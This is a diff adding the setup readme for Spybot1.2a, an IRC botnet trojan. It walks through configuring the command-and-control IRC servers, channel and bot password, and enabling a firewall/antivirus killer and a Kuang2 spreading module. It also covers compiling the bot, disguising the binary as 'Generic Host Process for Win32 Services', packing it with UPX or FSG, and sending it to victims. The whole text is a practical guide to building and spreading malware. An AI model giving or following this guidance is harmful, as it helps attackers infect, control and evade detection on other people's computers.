@@ -1,0 +1,144 @@
+//////////////////////////////////////////////////////////
+//							//
+//		Spybot1.2a by Mich			//
+//							//
+//		Opensource irc bot 			//
+//							//
+//	    IRC: irc.babbels.com #dreams		//
+//	    						//
+//	      opensource_bot@hotmail.com		//
+//	    						//
+//		use at your own risk.			//
+//							//
+//	       Good luck and have fun!			//
+//							//
+//////////////////////////////////////////////////////////
+
+
+
+
+To make the server file you have to edit the file settings.h and change some settings
+If you have no idee how it works I sugest you only change the server’s, channel, channelkey, and password
+
+
+Changing the channel and channel password
+
+Open settings.h with notepad.exe and  you will see:
+char channel[] = "#spybox1.2"; //channel bot joins on connect
+char channelpass[] = "spykey"; //password of the channel
+
+that will say #spybot1.2 is the channel to join and spykey is the channelkey
+if you don’t want to use a channelkey you can leaf it empty like this:
+char channelpass[] = ""; //password of the channel
+But you have to set a channel if you want your bots to join the channel #botz you get this line:
+
+char channel[] = "#botz"; //channel bot joins on connect
+
+Or if the have to join #Mybots:
+
+char channel[] = "#Mybots"; //channel bot joins on connect
+
+
+Changing the bots password:
+
+Open settings.h with notepad.exe and if you scroll down you will see:
+
+char password[] = "password"; //bots password
+
+This is the bots password that you must use to login with the login command
+It works the same as changing the channel just make sure you leave the " in place. 
+If you want to set your password to mybotspass it will look like 
+
+char password[] = "mybotspass"; //bots password
+
+
+
+
+Changing the servers:
+
+open settings.h with notepad.exe and if you scroll down you will see:
+//servers
+
+char *ircservers[]={
+	"eu.undernet.org",
+	"irc.icq.com",
+	"chat.wanadoo.nl",
+	"irc.quakenet.eu.org",
+	NULL //dont remove this line
+};
+
+//number of ports MUST be the same as the number of servers you use, 
+
+int serverports[]={ 
+	6667,
+	6666,
+	6667,
+	6667,
+};
+
+this are the irc servers and ports where the bot try’s to connect to. eu.undernet.org on port 6667, irc.icq.com on port 6666 etc.  starting with the first server in the list
+You can add or remove as many as you want but make sure that the number of ports you have is the same as the number of servers.
+Example if you want to add the server irc.dal.net on port 6001 it will look like this
+
+char *ircservers[]={
+	"irc.dalnet.net",
+	"eu.undernet.org",
+	"irc.icq.com",
+	"chat.wanadoo.nl",
+	"irc.quakenet.eu.org",
+	NULL //dont remove this line
+};
+
+//number of ports MUST be the same as the number of servers you use, 
+
+int serverports[]={ 
+	6001,
+	6667,
+	6666,
+	6667,
+	6667,
+};
+
+or if you want only the server irc.isdnet.fr on port 6669 it will look like this:
+
+char *ircservers[]={
+	"irc.isdnet.fr",
+	NULL //dont remove this line
+};
+
+//number of ports MUST be the same as the number of servers you use,
+
+int serverports[]={ 
+	6669,
+}
+
+
+Other:
+
+To enable or disable a option You have to remove or add the // in front of the line
+Example:
+If you want to disable the firewall/AV killer add // in front of this line: #define Use_Firewall_killer;
+
+So it will look like this:
+//#define Use_Firewall_killer;
+
+same for the kuang spreader
+Enabled:
+#define KUANG2_SPREADER;
+Disabled:
+//#define KUANG2_SPREADER;
+
+etc. 
+
+
+
+Compiling the server!
+
+
+
+If you have set your settings you must Compiling the server. 
+To do that you must have lcc-win32. Download it from: http://www.q-software-solutions.com
+And install it to c:\lcc\ if you dont put it in that dir you have to change the makefiles (“make spybot.bat” and “make with versioninfo.bat”)
+The only difference between “make spybot.bat” and  “make with versioninfo.bat” is that “make with versioninfo.bat” sets the version info from the server file to “Generic Host Process for Win32 Services” and add a icon to the server file.
+If you have installed lcc-win32 and changed your settings in settings.h then you can just run “make spybot.bot” and if everything is oke you will see a file called spybot.exe that’s your server file!
+You can pack it with upx or fsg and then send it to your vics..
